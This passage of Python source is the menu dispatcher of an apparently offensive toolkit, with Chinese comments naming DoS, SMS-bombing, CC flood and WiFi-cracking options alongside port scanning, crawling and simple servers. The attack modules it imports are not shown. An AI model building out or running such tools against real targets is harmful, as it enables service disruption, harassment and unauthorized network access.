                program_attack = input(":")
                if program_attack == "1":#工具包指令 DOS攻击包
                    from Code.attack_1 import attack_dos_main
                    attack_dos_main()
                elif program_attack == "2":#工具包指令 短信轰炸
                    from Code.attack_2 import attack_2_main
                    attack_2_main()
                elif program_attack == "3":#工具包指令 cc攻击包
                    from Code.attack_CC import attack_cc_main
                    attack_cc_main()

            elif program_input == "wifi":
                print(wifi_help)
                program_wifi = input(":")
                if program_wifi == "1":#工具包指令 连接Wi-Fi
                    from Code.wifi_1 import wifi_1_main
                    wifi_1_main()
                elif program_wifi == "2":#工具包指令 WiFi破解
                    from Code.wifi_2 import wifi_2_main
                    wifi_2_main()
                elif program_wifi == "3":#工具包指令 扫描周围WiFi
                    from Code.wifi_3 import wifi_3_main
                    wifi_3_main()
                elif program_wifi == "4":#工具包指令 无限连接Wi-Fi
                    from Code.wifi_4 import wifi_4_main
                    wifi_4_main()

            elif program_input == "listen":
                print(listen_help)
                program_listen = input(":")
                if program_listen == "1":#工具包指令 监听IP主机的端口状态
                    from Code.listen_1 import listen_1_main
                    listen_1_main()
            
            elif program_input == "port":
                print(port_help)
                program_port = input(":")
                if program_port == "1":#工具包指令 查看IP开放端口
                    from Code.port_1 import port_1_main
                    port_1_main()
                elif program_port == "2":#工具包指令 查看端口是否开放工具包指令
                    from Code.port_2 import port_2_main
                    port_2_main()
            
            elif program_input == "crawler":
                print(crawler_help)
                program_crawler = input(":")
                if program_crawler == "1":#工具包指令 爬取网站的源代码
                    from Code.crawler_1 import crawler_1_main
                    crawler_1_main()
                elif program_crawler == "2":#工具包指令 爬取网站状态
                    from Code.crawler_2 import crawler_2_main
                    crawler_2_main()
            
            elif program_input == "server":
                print(server_help)
                program_server = input(":")
                if program_server == "1":#工具包指令 创建一个服务器(网站)
                    from Code.server_1 import server_1_main
                    server_1_main()
                elif program_server == "2":#工具包指令 创建一个下载文件服务器(网站)
                    from Code.server_2 import server_2_main
                    server_2_main()

            else:
                try:
                    from Code.plugins import run_plugins
                    target_line = program_input
                    run_plugins(target_line)
                except FileNotFoundError:
                    continue

        except Exception as e:
            print(f"发生错误:\n{e}")

if __name__ == "__main__":
    os.system("cls" if os.name == 'nt' else 'clear')
    print("<ANSportion> 正在运行...")
    os.system("cls" if os.name == 'nt' else 'clear')
    print("正在检查当前系统")
    os.system("cls" if os.name == 'nt' else 'clear')
    print(f"当前系统为: {system}")
    if system in ["Windows", "Linux", "Darwin"]:
        pass
    else:
        print("该系统不支持运行此程序")
        print("是否继续运行?(y/n)")
        choose = input(":")
        if choose in ["y", "Y"]:
            pass
        else:
            sys.exit()
    os.system("cls" if os.name == 'nt' else 'clear')

    ANSportion_title_random = random.randint(1, 2)
    if ANSportion_title_random == 1:
        print(Fore.YELLOW + ANSportion1_1 + Fore.RESET)
    elif ANSportion_title_random == 2:
        print(Fore.YELLOW + ANSportion1_2 + Fore.RESET)

    print(Fore.YELLOW + ANSportion2 + Fore.RESET)
    print(Fore.YELLOW + f"{'-' * 100}" + Fore.RESET)
    if os.path.exists("更新日志1.ans"):
        with open("更新日志1.ans", 'r', encoding='utf-8') as file:
            log_content = file.read()
        print(Fore.CYAN + f"更新日志1:\n{'=' * 65}\n更新日志内容:" + Fore.RESET)
        print(Fore.CYAN + log_content,f"\n{'=' * 65}" + Fore.RESET)
    else:
        print("日志文件不存在")
    print(ANSportion3)
    program_code_body()
